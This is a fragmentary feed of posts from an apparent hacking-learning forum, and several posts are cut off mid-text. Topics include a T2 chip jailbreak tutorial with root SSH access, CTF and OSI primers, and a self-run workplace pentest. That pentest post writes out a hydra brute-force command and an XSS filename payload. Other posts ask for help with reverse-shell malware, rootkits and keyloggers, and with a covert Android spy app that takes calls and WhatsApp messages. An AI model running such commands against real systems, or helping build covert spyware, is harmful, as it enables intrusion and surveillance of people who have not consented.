            <p>So I’m in a situation where Responder could be useful but I somehow remember hearing that i could take down the network with the LLMNR poisoning.</p>
<p>Would running Responder WPAD to certain targeted machines pose a real risk of taking down the infra?</p>
<p>thanks!<br>

          <title>Jailbreaking T2 Chip</title>
          <dc:creator><![CDATA[Ph03n1x_Crus4d3r]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>I haven’t seen much in the way of jailbreaking, or Apple security in general. As that is that I’ve been focusing on a lot recently, I will be making posts from time to time about it, as well as tutorials.</p>
<h2>What is the T2 Security Chip</h2>
<p>The Apple T2 is a trusted security chip. It secures essential features, such as Secure Boot, Activation Lock, Touch ID, encrypted data storage, etc.</p>
<p><strong>How does Apple T2 security chip work?</strong><br>
The T2 chip has control over the MacOS boot procedure. It makes sure everything that runs on the Mac hardware is Apple-approved. Its work begins as soon as a power button is pressed on your Mac computer and lasts until you see MacOS desktop. In other words, one of its primary functions is to verify that Apple has signed your OS and boot loader. The T2 chip, which runs a software called BridgeOS (heavily modified version of WatchOS) never turns off, except for when the battery is dead (obviously).</p>
<p>The T2 is also responsible for all encryption data on the hard drive. In previous Mac versions, this function was performed by CPU, which slowed down the Mac as a whole. By moving these features to the T2 Chip, Apple has significantly improved the newer Mac’s performance, as well as allows for the security of TouchID. The fingerprint scanner in these devices gives a user a quick login option and approves the admin-level requests.</p>
<p>It also handles verification requests from different apps. The T2 Chip makes sure that no applications get access to your fingerprint information through Touch ID. When the verification is requested, the Apple T2 Security chip compares the fingerprint with data secured in the enclave coprocessor and notifies of the result.</p>
<p>The T2 is based on the A9 iPhone ARM processor, which makes it vulnerable to the same checkm8 exploit that Apple devices with A6-A11 processors are. I will be making a separate post as to how the checkm8 exploit actually works, and how it was integrated into checkra1n, the tool for jailbreaking the vulnerable devices.</p>
<h2>How to Jailbreak T2 Chip using Checkra1n</h2>
<p>Before you go about jailbreaking the T2 chip, you first need:</p>
<ul>
<li>Mac with T2 chip capable of being jailbroken</li>
<li>Another computer running MacOS (NOT an M1 Mac)</li>
<li>USB-C to USB-C cable</li>
</ul>
<p><strong>Step 1.</strong> Download the latest checkra1n software on the MacOS you are not jailbreaking. This can be done by visiting the official site <a href="https://checkra.in" rel="noopener nofollow ugc">here</a>, or, if using Homebrew, by simply typing <code>brew install --cask checkra1n</code></p>
<p><strong>Step 2.</strong> Put your Mac in DFU mode. This is a manual process that can take some time and effort to get right. I created a quick guide on my website, linked <a href="https://sh4d0wph03n1x.github.io/dfumode.html" rel="noopener nofollow ugc">here</a>.</p>
<p><strong>Step 3.</strong> As of right now, the GUI version of checkra1n does not support T2 jailbreak. As such, we have to use the cli version. In order to do so, open the terminal, and type <code>/Applications/checkra1n.app/Contents/MacOS/checkra1n -c -v</code></p>
<p>This will open checkra1n in cli mode and it will start searching for a DFU device. Once one is found, it will complete the jailbreak, and you have root access of your T2 chip! Sometimes, checkra1n with throw error code 20. If so, just relaunch checkra1n until it says <code>Bootstrap already installed</code>.</p>
<p><strong>Step 4.</strong> SSH into your T2 chip by iproxy.<br>
<code>iproxy 2222 44</code><br>
Do NOT close the window, just open a new one, and type:<br>
<code>ssh root@localhost -p 2222</code><br>
with the root password of <code>alpine</code>. You now have an SSH shell into your chip!</p>
<h2>What can I do with this?</h2>
<p>Now is time for some practical examples of what can be done with a T2 chip jailbreak. The issue is that this is where ALL of Mac’s security is, meaning that the drive can be unencrypted, a malicious EFI could be installed, etc. There was a PoC of a BridgeOS keylogger listening to MacOS at all times. Since it was considered completely trusted by MacOS, it could not possibly be detected by the user. I am doing more and more research and testing every day, and will post updates of cool things you can do as I go along. I will, at some point, be posting how to change the boot sound on Mac by using this method. Thanks for reading!</p>

            <p>So, I have read many great posts here on getting started with hacking. Now, I know this is a life long journey and will take me years to even be decent at it. I started reading books about exploit development and reverse engineering. Each and every book states “I need to know assembly in order to develop my exploits” Thing is, I can’t seem to find any great resources to help me learn assembly. Sure, there are some books out there. But every architecture has a different syntax. With that said, I don’t know if I should learn an assembler like FASM, NASM or AT&amp;T.</p>

            <p>Hi</p>
<p>I wanted to know what type of code analysis/auditing I should do in order to find vulnerabilities in web applications.<br>
Before asking, I did some googling and there weren’t anything about “Web app code analysis”, there are posts usually about Windows and it’s lovely API.</p>
<p>So I would like to know how bugs in libraries/frameworks/CMS(s) are found.<br>
I just know python, but I see that lots of these things are written in PHP, as a hacker, what do you look for and how do you even begin reading source code of these things?</p>

            <p>Hi folks</p>
<p>I been confused lately about malware development, I am familiar with python and use it for web development however I know that it’s not the right language for malware development.<br>
The reason that I picked python at first place was because I was told “It’s a general purpose programming language &amp; you can do anything with it”.<br>
The moment I became an intermediate programmer, I found out that python is not general purpose, even if I create a malware and compile it to executable,<br>
I still can’t run it everywhere since every python executable is created for your local system specs.</p>
<p>Now I have too many question but since some of ya just like to push noobs and tell them to “Google it”, I will first list all the resources I have read and they didn’t help:</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://thepythoncode.com/article/create-reverse-shell-python">

1: isn’t there any other protocol to build windows/linux reverse shell backdoor? I mean I want to build malware for windows, linux &amp; OSX but I am unsure, if this is the only way,<br>
most of the tutorials I have read point out to using TCP, I know what TCP/UDP is but I am just asking, are these the only way?<br>
2: Why do people suggest C and Assembly for Malware writing?<br>
I mean, you need to actually compile C code to an executable, and that executable doesn’t work everywhere:</p><aside class="onebox stackexchange" data-onebox-src="https://stackoverflow.com/questions/58336827/how-to-run-a-c-program-i-wrote-on-another-computer">

            <p>Hi everyone,</p>
<p>I am currently working on a Spy Android app which will fetch user’s call logs, SMS, Whatsapp messages,  and even i want to record calls (like listen on going call or record calls on server). I am begginner and i dont know much about Android development but still i am creating and trying hard to finish that. I am stuck at a point that how to get access to user’s whatsapp messages and store them on server. Further, i don’t know how to track user’s calls. I want to ask you all please suggest me some sources, functionalities any thing which will help me to fulfill my task. I am searching hard on internet but i not get any relevent information to fulfill my task. For whatsapp, i come to know that if we get mobile’s root access then we can get decryption key of encrypted whatsapp database from user’s phone but i know how to write a code to get android’s root access…Please help.</p>

            <p>Hi, I’m a bit of a script kiddie and I dont want to keep relying on tools like msfvenom and that, I want to be able to develop my own rootkits, bitcoin miners, keyloggers and botnets. But i don’t know where to look for help or where to learn about this. If anybody can hold my hand through this or point me in the right direction to where I can go from 0 to 100 hackerman.</p>
<p>And no I’m not a complete noob don’t worry I have a decent amount of experience, just don’t know what language to use or how to even write it. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>

          <title>How To Get Started in CTF?</title>
          <dc:creator><![CDATA[muffin]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <blockquote>
<p>First, What are CTF Competitions?</p>
</blockquote>
<p>Capture the Flag (CTF) is a special kind of information security competition There are three common types of CTFs: Jeopardy, Attack-Defence and mixed.</p>
<p>Jeopardy-style CTFs have a couple of questions (tasks) in a range of categories. For example, Web, Forensic, Crypto, Binary or something else. A team can gain some points for every solved task. More points for more complicated tasks usually. The next task in a chain can be opened only after some team solves the previous task. Then the game time is over the sum of points shows you a CTF winner.</p>
<p>Attack Defence is another interesting kind of competition. Here every team has own network(or only one host) with vulnerable services. Your team has time for patching your services and developing exploits usually. So, then organizers connect participants of the competition and the wargame starts! You should protect own services for defense points and hack opponents for attack points. Historically this is the first type of CTFs, everybody knows about <a href="http://ctftime.org/ctf/2/" rel="noopener nofollow ugc">DEF CON CTF</a> — something like a World Cup of all other competitions.</p>
<p>Mixed competitions may vary possible formats. It may be something like wargame with special time for task-based elements</p>
<p>CTF competitions generally focus on the following skills: reverse engineering, cryptography, ACM style programming, web vulnerabilities, binary exercises, networking, and forensics. Pick one and focus on a single topic as you get started…</p>
<ol>
<li>Reverse Engineering: I highly suggest that you get a copy of IDA Pro. There is a free version available as well as a discounted student license. Try some crack me exercises. Write your own C code and then reverse the compiled versions. Repeat this process while changing compiler options and program logic. How does an “if” statement differs from a “select” in your compiled binary? I suggest you focus on a single architecture initially: x86, x86_64, or ARM. Read the processor manual for whichever one you choose. Book recommendations include:</li>
</ol>
<blockquote>
<p>Practical Reverse Engineering</p>
</blockquote>
<blockquote>
<p>Reversing: Secrets of Reverse Engineering</p>
</blockquote>
<blockquote>
<p>The IDA Pro Book</p>
</blockquote>
<ol start="2">
<li>
<p>ACM style programming: Pick a high-level language. I recommend Python or Ruby. For Python, read Dive into Python (free) and find a pet project you want to participate in. It is worth noting that Metasploit is written in Ruby. Computer science classes dealing with algorithms and data structures will go a long way in this category as well. Look at past programming challenges from CTF and other competitions — do them! Focus on creating a working solution rather than the fastest or most elegant solution, especially if you are just getting started.</p>
</li>
<li>
<p>Web vulnerabilities: There are many web programming technologies out there. The most popular in CTF tend to be PHP and SQL. The <a href="http://php.net" rel="noopener nofollow ugc">php.net</a> site is a fantastic language reference. Just search for any function you are curious about. After PHP, the next most common way to see web challenges presented is with Python or Ruby scripts. Notice the overlap of skills? There is a good book on web vulnerabilities, The Web Application Hacker’s Handbook. Other than that, after learning some of the basic techniques, you might also think about gaining expertise in a few of the more popular free tools available. These are occasionally useful in CTF competitions too. This category also frequently overlaps with cryptography in my experience.</p>
</li>
<li>
<p>Binary exercises: This is my personal favorite. I recommend you go through reverse engineering before jumping into the binary exercises. There are a few common vulnerability types you can learn in isolation: stack overflows, heap overflows, and format string bugs for starters. A lot of this is training your mind to recognize vulnerable patterns. Looking at past vulnerabilities is a great way to pick up these patterns. You should also read through:</p>
</li>
</ol>
<blockquote>
<p>Hacking: The Art of Exploitation</p>
</blockquote>
<blockquote>
<p>The Shellcoders Handbook</p>
</blockquote>
<blockquote>
<p>The Art of Software Security Assessment</p>
</blockquote>
<ol start="5">
<li>Forensics: I suggest you learn how to use the 010 hex editor and don’t be afraid to make absurd, wild, random guesses as to what could be going on in some of these problems.</li>

<ol start="6">
<li>Cryptography: Try with the basic terminology and concepts so that when you read about hashing, Wireless cracking or Password Cracking and encryption technologies. There is a very specialized language for cryptography and encryption. Terms like cipher, plaintext, ciphertext, keyspace, block size, and collisions can make studying cryptography a bit confusing and overwhelming to the beginner. I <em>will</em> use the term “collision,” as there is no other word in plain English that can replace it.</li>

          <title>Arch - Black ! (0x0)</title>
          <dc:creator><![CDATA[blankdash]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>Although there are a lot of Pentesting operating systems available Black arch seems to be a really good arch based distribution and it contains a ton of tools the one could make use of. I decided to review and make a guide based on black arch linux.</p>
<p>Now before getting started i would like to say that the popular Distributions such as Kali linux, Parrot Security OS, Black box are still an obvious choice for someone that is getting started in Pentesting.</p>
<p>Black Arch is yet another distro based on Arch linux, and people like me who has been using Arch as a primary operating system always have to either install tools manually from AUR (Arch User Repository), Install a Pentesting Distro like kail in a VM or build tools from source. Black arch makes that much simpler in a lot of cases. I wouldnt call it the most stable release, but if your some one that is familiar with linux, this is something that you would like.</p>
<p><span class="hashtag">#1</span> How do you install Black Arch ?</p>
<p>Well, yo could get started here <a href="https://blackarch.org/blackarch-guide-en.pdf" rel="noopener nofollow ugc">https://blackarch.org/blackarch-guide-en.pdf</a></p>
<p>The guide contains a bunch of details on installing Black arch. You have different options to do that</p>
<ul>
<li>
<p>Install Black Arch as you Primary OS / in Vm ( Download the ISO image from here <a href="https://blackarch.org/downloads.html" rel="noopener nofollow ugc">https://blackarch.org/downloads.html</a> )</p>
</li>
<li>
<p>Install Black Arch on top of your existing Arch Linux distro i.e : Manjaro</p>
</li>
<li>
<p>Build on from scratch.</p>

          <title>A Brief Introduction To [DD vs ISO] Mode Image Writing</title>
          <dc:creator><![CDATA[BL4CKH47H4CK3R]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>Hello, 0x00’ers!</p>
<p>I am <a class="mention" href="https://d.clarkee.co.uk/u/bl4ckh47h4ck3r">@BL4CKH47H4CK3R</a>. Many peoples PM me about this things. So now I am going to describe the [DD vs ISO] Mode Image Writing.</p>
<h1>DD vs ISO Mode : →</h1>
<p>DD basically stands for Disk Dumping. DD is an exact clone of the image onto the USB. Basically, this flat copies the image byte by byte onto the USB, so if you look at the image in hex and see it starts with something like  <code>33 ED 90 90 ...</code>  then what Rufus or any other DD application will do is copy  <code>33 ED 90 90 ...</code>  onto the USB, starting at the first byte of the first sector, and continue to copy bytes until the data from the image is exhausted. That’s all DD does, and it usually ensures that you get an exact clone of the image or device the maintainer of the distro created.</p>
<p>One advantage is that it doesn’t require partitioning or formatting, and it can create USB drives with file systems that Windows is unable to handle on its own (such as ext# or anything *BSD). But this can also be one of the drawbacks, as it means you will usually find that you cannot access the content of your USB any longer after it has been created. So if you want to modify some settings, or want to access the doc, or, say, copy the firmware for your Wifi card onto the USB, you may not be able to do so. Also, even if you are able to access the content, you will find that the available size you have is a lot less than the total size of your USB. For instance, if you DD copy a 4GB image onto a 16GB USB, then even if you can access your drive from Windows, you will only ever be able to access 4GB of your drive, and not 16.</p>
<p>Finally, the choice between DD and ISO only applies to ISOHybrid images (not all ISOs are ISOHybrid!), which is a somewhat brittle  <strong>hack</strong>  that tries to make optical disc filesystems (ISO9660 or UDF) something that they were never designed to do (which essentially boils down to making it look like a completely different file system, along with constructs, such as a partition table, that are not meant to apply to optical media), so it takes A LOT of trial and error to get something that kind of works, but has some limits.</p>
<p>On the other hand what ISO mode does is partition and format the USB in a way that Windows can always understand (and using the  <strong>whole</strong>  capacity of the drive), and then copy each individual file and directory from the ISO image onto the newly created file system.</p>
<p>One of the drawback this has is that the boot loading and later process of the media has to be able to handle a Windows file system (usually FAT32, but it could be NTFS or exFAT), which may come with some limitations, but this is usually not an issue for something like an installation media.<br>
Also, if you have a lot of small files the copy process in ISO mode can be a lot slower than the DD mode copy process. But as I pointed above, ISO mode also ensures that you can always access the full content of your USB.</p>
<p>If you want a quick analogy, you can consider that DD mode is similar to cloning a whole bookshelf, full of books, into your living room. For some cases, cloning the bookshelf in one go may be the best option, but in others, you may find that this bookshelf is locked with a key that you don’t have, and it has to sit right in the middle of your living room, which prevents you from installing a couch, or something else.</p>
<p>On the other hand, ISO mode is akin to first providing you with a bookshelf, which is tailored to the space you have against a wall of your choosing, and then cloning books one by one into it. It’s a bit more tedious and slow, but if you have a large wall, it will leave you with a similarly large bookshelf, that you can later use to put other books. Also, it isn’t locked, so you can always access both the books that were copied over, as well as any new book you put in it.</p>
<p>Hope that explains it, and also the reason why Rufus usually recommends to try using ISO mode first, and only use DD mode if you have an issue with ISO mode.</p>
<p>As far as Arch is concerned, ISO mode should work very well (because the Arch maintainers tend to be very good at what they are doing), but in the end it’s really up to you to pick the mode you want.</p>

          <title>Notes on the OSI Model</title>
          <dc:creator><![CDATA[0xf00f77]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>Howdy Pardners,</p>
<p>One thing I see commonly commonly listed as being prerequisite knowledge for many IT/CS fields is a general understanding of the OSI model. I’ve slowly been taking my notes and publishing them off of my github page, and noticed that while I see the OSI mentioned here in posts that there did not seem to be a general overview. This is a mixture of my own thoughts and descriptions, as well as descriptions from various other sources (which I am trying to track down and add) that I thought wrote better than I. Hopefully this description is helpful for other learning the same info, or as a reference as needed to refresh. I am by no means a networking guru, so any additional information I should add, corrections I should make, or examples of practical usage of the OSI model would be much appreciated!</p>
<p>The Open Systems Interconnection (OSI) model is a reference model used to describe various related concepts in computer networking. The OSI model provides a framework of layers which describe communications functions that may be performed by any number of protocols, though it should be noted that not every layer is always needed. Each layer represents its own abstraction which interfaces in some form with the layers adjacent to itself. A layer serves the layer above it and is served by the layer below it. For example, the layer that ensures error-free communications across a network provides the path needed by applications above it, while it calls the next lower layer to send and receive packets that constitute the contents of that path. Multiple instances of layers are possible (such as multiple application layers operating simultaneously, but not dependent on one another). Running discord whilst using filezilla would create multiple abstractions of the application layer which are not hierarchically dependent upon one another.</p>

</div><h2>Layer 7: Application layer</h2>
The application layer provides an interface for the end user operating a device connected to a network. It is not in itself an application but represents the component within the application which controls communication with other devices. This masks the rest of the application from the data transmission, relying upon all the layers below to complete this process. The data is at this stage presented in a way the user can understand.  
<ul>
<li>Remote login to hosts: Telnet</li>
<li>File transfer: File Transfer Protocol (FTP), Trivial File Transfer Protocol (TFTP)</li>
<li>Electronic mail transport: Simple Mail Transfer Protocol (SMTP)</li>
<li>Networking support: Domain Name System (DNS)</li>
<li>Host initialization: BOOTP</li>
<li>Remote host management: Simple Network Management Protocol (SNMP), Common Management Information Protocol over TCP (CMOT)</li>
</ul>
<hr>
<h2>Layer 6: Presentation layer</h2>
The presentation layer takes the information that the application layer of one system sends out and ensures that it is readable by the application layer of another system. This is often needed for services such as translation between different types of machines, data compression, and encryption (though not all encrption is handled at the presentation layer). If necessary, the presentation layer might be able to translate between multiple data formats by using a common format.  
<ul>
<li>Multipurpose internet mail extensions (MIME)</li>
<li>External data representation (XDR)</li>
<li>Secure Sockets Layer (SSL)</li>
</ul>
<hr>
<h2>Layer 5: Session layer</h2>
This layer establishes request/response communication. When needed a session is started with authentication, after which a request is sent. After a response the session might be ended or a new request is sent. This is the first layer where a client/server concept is introduced. A specific device might change the role from client to server or vice versa. Essentially, the session layer responds to service requests from the presentation layer and issues service requests to the transport layer, often communicated through application program interfaces (APIs). 
<ul>
<li>SOCKS</li>
<li>Session announcement protocol (SAP)</li>
<li>Network basic input/output system (NETBIOS)</li>
</ul>
<hr>
<h2>Layer 4: Transport layer</h2>
The Transport Layer is the level at which system reliability and quality are ensured. This layer manages traffic flow through the network layer to reduce congestion on a network. Since the lower layers handle the actual delivery of data between devices, the transport layer performs error checking, ensuring quality of service by resending data when data has been corrupted (acknowledgements and retransmission timers are a common method). Some methods of encryption and firewall security take place on this layer. The protocols of this layer provide host-to-host communication services for applications. Since many applications may be running and sending or receiving data simultaneously, the transport layer must be able to combine the data in a manner which can later be reversed by the receiving device so that the data is recieved by the correct processes (multiplexing and demultiplexing).  
<ul>
<li>Transmission control protocol (TCP)</li>
<li>User datagram protocol (UDP)</li>
</ul>
<hr>
<h2>Layer 3: Network layer</h2>
The Network layer provides the means of transferring variable-length network packets from a source to a destination host via one or more networks. Within the service layering semantics of the OSI network architecture, the network layer responds to service requests from the transport layer and issues service requests to the data link layer. The Network (or routing) Layer works to coordinate related parts of a data conversation to ensure that large files are transferred. In other words, while the data link layer deals with the method in which the physical layer is used to transfer data, the network layer deals with organizing that data for transfer and reassembly via datagram encapsulation. This layer also handles aspects of Routing Protocols, finding the available [best] path(s) from one network to another to ensure delivery of the data.  
<ul>
<li>Internet protocol (IPv4, IPv6)</li>
</ul>
<hr>
<h2>Layer 2: Data link layer</h2>
This layer is the protocol layer that transfers data between adjacent network nodes in a wide area network (WAN) or between nodes on the same local area network (LAN) segment. The Data link layer is mainly the method in which information from the network is broken down into frames and transmitted over the physical layer. This layer is also responsible for some error detection and correction; and some addressing so different devices can tell each other apart in larger systems. Examples of data link protocols are Ethernet for local area networks (multi-node), the Point-to-Point Protocol (PPP), HDLC and ADCCP for point-to-point (dual-node) connections. In the Internet Protocol Suite (TCP/IP), the data link layer functionality is contained within the link layer, the lowest layer of the descriptive model, which also includes the functionality encompassed in the OSI model's physical layer.  
<ul>
<li>Ethernet protocol (IEEE 802.3)</li>
<li>Point-to-point (PPP)</li>
<li>Media Access Control (MAC)</li>
</ul>
<hr>
<h2>Layer 1: Physical layer</h2>
The physical layer translates logical communications requests from the data link layer into hardware-specific operations to cause transmission or reception of electronic signals. In other words, this is the layer where data is actually moved across the network. It specifies how a device sends and receives information, such as using copper wires or fiber-optic cables. Examples of this include Ethernet or fiber optic cables, phone cords used for dial-up or DSL services, the coaxial cable used to provide broadband internet, the wires used to connect various components of a computer or even the radio signals used in wireless communication. Other functions of the physical layer include the conversion of signals into something that another layer can use (referred to as a bit) and adjusting the signal to allow for multiple users to use the same connections. Within the semantics of the OSI model, the physical layer translates logical communications requests from the data link layer into hardware-specific operations to cause transmission or reception of electronic signals.  
<ul>
<li>Ethernet protocol (IEEE 802.3)</li>
<li>Universal serial bus (USB)</li>
<li>Bluetooth</li>
</ul>

          <description><![CDATA[
            <p>A crazy thing happened at work - I’ve been interested in Application Securty<br>
and pentesting for almost 2 years now, but only recently have I started to become<br>
more active in order to gain knowledge.</p>
<p>They knew this at work, so I called for a 1:1 with my supervisor, and asked</p>
<blockquote>
<p>What if I’d take ownership of our application’s security?</p>
</blockquote>
<p>I’ve prepared some notes why I want to do this (self development, motivation),<br>
or why is it good for the product &amp; company (big customers will be interested to know where<br>
and how their data is stored and retained at the very least), but to my surprise,<br>
before I could even start vouching for myself, the answer was</p>
<blockquote>
<p>Yes, we’d love that to happen</p>
</blockquote>
<p>I was quite surprised by the answer, but their reasons were very similar to what I was about to say.<br>
Win-win, right?</p>
<p>After some internal celebration (while keeping a straight face), I started to make plans<br>
on what I’d like to do in my new position.</p>
<h2><a name="p-42425-the-pentest-1" class="anchor" href="https://d.clarkee.co.uk#p-42425-the-pentest-1"></a>The Pentest</h2>
<p>As the 0th step, I started to pentest our application - I didn’t expect<br>
any mind blowing results, since I’m biased by knowing the internals and I’m<br>
not that good yet to find non-obvious issues. For the record, and without giving away too much:<br>
the application is using Angular on the client and Django on the server, all on AWS.</p>
<p>With this in mind, I still went ahead and did it, and I was quite pleased, because:</p>
<ul>
<li>I could run my first ever brute-force attempt on a real site - I didn’t get a password<br>
for the account I was using, but that won’t make it any less of an issue.<br>
The command I used is <code>hydra -l snail@xxx.com -P ~/Downloads/rockyou.txt xxx.xxx.xxx.xxx http-post-form '/oauth/token:username=^USER^&amp;grant_type=password&amp;password=^PASS^:Unauthorized' -V</code></li>
<li>I did implement a CSRF and a Clickjacking PoC - CSRF couldn’t be exploited, but due to a missing <code>X-Frame-Options</code> header, the latter PoC worked, YAY! Also made a note that the original site is <code>sub.domain.com</code>, and <code>sub-domain.com</code> is available, so it’d be easy to fool someone.</li>
<li>Every single user input field I’ve found I tested for XSS - with all the wonky characters you can imagine (and even <img src="https://d.clarkee.co.uk/images/emoji/twitter/zany_face.png?v=15" title=":zany_face:" class="emoji" alt=":zany_face:" loading="lazy" width="20" height="20"> emojis) - I must say I was impressed when nothing I tried has worked. I’ve also tried uploading avatars with names like <code>-1.jpg" onerror="alert(1)"</code>, but again, it was all sanitized.</li>
<li>SQL Injection didn’t work - but I wasn’t expecting it anyway</li>
<li>I’ve found 3 CVEs for our dependencies, but they all relied on certain configurations, which<br>
we didn’t have - lucky us I guess?</li>
<li>I did find a couple of misconfiguration issues, and a way of triggering an Internal Server Error<br>
with a file upload, which sounds interesting, maybe I could do something with it.</li>
</ul>
<p>You know what they say:</p>
<blockquote>
<p>If you failed a pentest, you know where your biggest vulnerabilities are, if you passed one, it doesn’t mean you’re secure, but instead it means you don’t know what are your weaknesses</p>
</blockquote>
<p>While I really enjoyed doing the above, and will carry on doing it for a couple of days to see if I can find anything<br>
meaningful, I’d like to involve an external pentester team at some point.</p>
<h2><a name="p-42425-whats-next-2" class="anchor" href="https://d.clarkee.co.uk#p-42425-whats-next-2"></a>What’s next?</h2>
<p>The next step is to write my first ever pentest report - which I’m looking forward to, there are a couple of<br>
good templates in <a href="https://github.com/juliocesarfort/public-pentesting-reports" rel="noopener nofollow ugc">this repo</a> that I plan<br>
to borrow some inspiration from.</p>
<p>I received some advice as well, one of them I think is probably the most important:</p>
<blockquote>
<p>… Which means first you need to build solid relationships with your development teams. You want them to feel comfortable. You want them to feel they won’t be slowed down coming to you. It needs to be a clean /good process for both sides.</p>
</blockquote>
<p>By <a href="https://twitter.com/jordan_ligas/status/1135885085729800192" rel="noopener nofollow ugc">Jordan Ligas on Twitter</a></p>
<p>Since I’m still part of the development team, I think this one is going to be relatively easy, but I think this is a very crucial part of one’s success as a security enthusiast.</p>
<p>The other is not much of an advice, but a good starting point, the “Your code”, “Your application”,<br>
and “Your product users” sections in the <a href="https://www.sqreen.com/checklists/saas-cto-security-checklist" rel="noopener nofollow ugc">SaaS CTO Checklist</a> will help you come up with the basics, and will point you to things you should learn about.</p>
<h2><a name="p-42425-summary-3" class="anchor" href="https://d.clarkee.co.uk#p-42425-summary-3"></a>Summary</h2>
<p>If you want to be involved with the security aspect of the software you’re working on,<br>
try to make the first step! I was surprised this was all it took, but yet here I am - and I think you can do this too!<br>
Especially if you’re working at a smaller firm, I think security is more important, since if they lose<br>
the trust of their users, it can mean the end of their company, whereas larger companies (ever heard of Equifax?)<br>
can survive breaches, either because they have the money to endure while they rebuild trust, or<br>
have something else that’ll make them resilient to losing customers.</p>

          <title>My thoughts after my first (real) attempt at Hackthebox</title>
          <dc:creator><![CDATA[hacker_snail]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>After my <a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871" rel="noopener nofollow ugc">previous post</a> I’ve been thinking about the next step,<br>
should I start a series where I implement all OWASP TOP10<br>
vulnerabilities and then break them?</p>
<p>It could’ve happened, but I decided to try myself at <a href="http://www.hackthebox.eu" rel="noopener nofollow ugc">hackthebox</a>.<br>
I had an account for almost 2 years, and all I had was 2 user owns in the last two months<br>
(which were <em>so</em> basic), and a couple of challenges done. A good first box seemed to be<br>
SwagShop, simply because I like earning stickers, and I thought this one would be cool<br>
(don’t worry, no spoilers here).</p>
<p>Long story short, after rooting SwagShop I just kept going and rooted another 3-4 boxes, in the span of 3 days.<br>
It was a wild ride, tons of new things to learn, same amount of frustration, but when<br>
I got the flag, it was all worth it - in fact it felt so good, I immediately forgot about<br>
the hours of staring at the screen murmuring</p>
<blockquote>
<p>it can’t be that, it just doesn’t work</p>
</blockquote>
<p>I’ve went from noob rank to hacker during this time, so I thought it’d be good to capture<br>
what I thought during these few days, what I liked, what were the challenges that I faced, and so on.</p>
<h2><a name="p-42090-the-bad-1" class="anchor" href="https://d.clarkee.co.uk#p-42090-the-bad-1"></a>The Bad</h2>
<h3><a name="p-42090-enumerating-non-web-related-services-like-smb-shares-rdp-2" class="anchor" href="https://d.clarkee.co.uk#p-42090-enumerating-non-web-related-services-like-smb-shares-rdp-2"></a>Enumerating non-web related services (like smb shares, rdp)</h3>
<p>I come from a software development background, and more specifically, I’ve been writing software for the web.<br>
This makes it easy for me to have a solid guess of the service if I see ports like <code>80</code>, <code>8080</code>, <code>3000</code>, <code>3306</code>, <code>5432</code> etc - but when <code>nmap</code> returned something like <code>445</code> - I had no idea what it was.<br>
In fact this was the first time I’ve explored SMB following <a href="https://0x00sec.org/t/my-hackthebox-ctf-methodology-from-fresh-box-to-root/13980/7" rel="noopener nofollow ugc">this handy guide</a> by <a class="mention" href="https://d.clarkee.co.uk/u/pry0cc">@pry0cc</a> .<br>
To ease my own pain, I’ve bookmarked a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers" rel="noopener nofollow ugc">Wikipedia article</a> that I can use as a reference.</p>
<h3><a name="p-42090-looking-at-code-requires-a-totally-different-mindset-3" class="anchor" href="https://d.clarkee.co.uk#p-42090-looking-at-code-requires-a-totally-different-mindset-3"></a>Looking at code requires a totally different mindset</h3>
<p>At work we do a lot of pair programming (the bane of my existence) and whatever’s left is reviewed.<br>
If you’ve ever worked as a developer in a team, you know that there are many things to check,<br>
code styling, design patterns, architecture, etc - but this is different, and I had to make that switch.<br>
One of the boxes had some source code online that contained key information of rooting the box. After spending<br>
a good chunk of time on it, I already came up with many points, but none of them were relevant!<br>
The important bit is to read the code and think about what the dev(s) could’ve missed,<br>
if they forgot to catch an exception, or clean up some temporary data <img src="https://d.clarkee.co.uk/images/emoji/twitter/person_shrugging/2.png?v=15" title=":person_shrugging:t2:" class="emoji" alt=":person_shrugging:t2:" loading="lazy" width="20" height="20">.</p>
<p>This was one of the hardest changes I had to make so far, but one of the most enjoyable ones.</p>
<h3><a name="p-42090-off-by-one-errors-4" class="anchor" href="https://d.clarkee.co.uk#p-42090-off-by-one-errors-4"></a>Off by one errors</h3>
<p>I mean, we’ve all been there right?<br>
Can you spot what’s wrong with <code>some_command /root/rot.txt</code>? I couldn’t - it was embarrassing.<br>
I cooked up a real cool python script, but did I mess up the operator and used <code>+</code> instead of <code>-</code>? Yes, I totally did.</p>
<p>I’m still thinking about this - but probably for my own scripts, I’ll to stick to <a href="https://en.wikipedia.org/wiki/Test-driven_development" rel="noopener nofollow ugc">TDD</a> - it’s one of the things<br>
that worked really well for me in the past, and I think it’d help me to write more reliable scripts.</p>

<p>What I’ve found to be an absolutely good way to spend my time is to look at an exploit, and then keep rewriting it,<br>
so that a proper script is the end result. The one you can show in your GitHub profile, the one where if you need to make some changes or reuse it on another<br>
service, it’d be a pleasure to do so. It’s also great for learning more in depth about the vulnerability you’re exploiting.</p>

<p>When I first tried SwagShop there were constant resets, and brute forcing attempts, making it hard to even enumerate, let alone proceed.</p>
<p>It👏 was👏 utterly👏 frustrating👏.</p>
<p>Once the box was a bit more stable, I decided to design myself a workflow,<br>
so that I could get back to the part where I was without much effort.<br>
This worked wonders for me in other boxes as well - every time I was in the middle of something and the machine got reset,<br>
I could get back in within a minute and continue where I left off.</p>
<p>For certain boxes this can be as simple as recording the passwords you’ve already obtained, but if you need to do something<br>
in order to get access, I encourage you to automate that bit.</p>

<h3><a name="p-42090-writing-code-9" class="anchor" href="https://d.clarkee.co.uk#p-42090-writing-code-9"></a>Writing code</h3>
<p>I’ve tried - I really did - to write all my scripts in nano/vim/emacs whatever. I just couldn’t bring myself to it.<br>
I’ve been spoiled by great IDEs that’ll tell me how wrong I am, and offer rich refactoring functionality just to mention a few.<br>
I felt like I spent more time doing tasks that are just a shortcut away in my daily work, so I went back to using the IDE for writing scripts.</p>
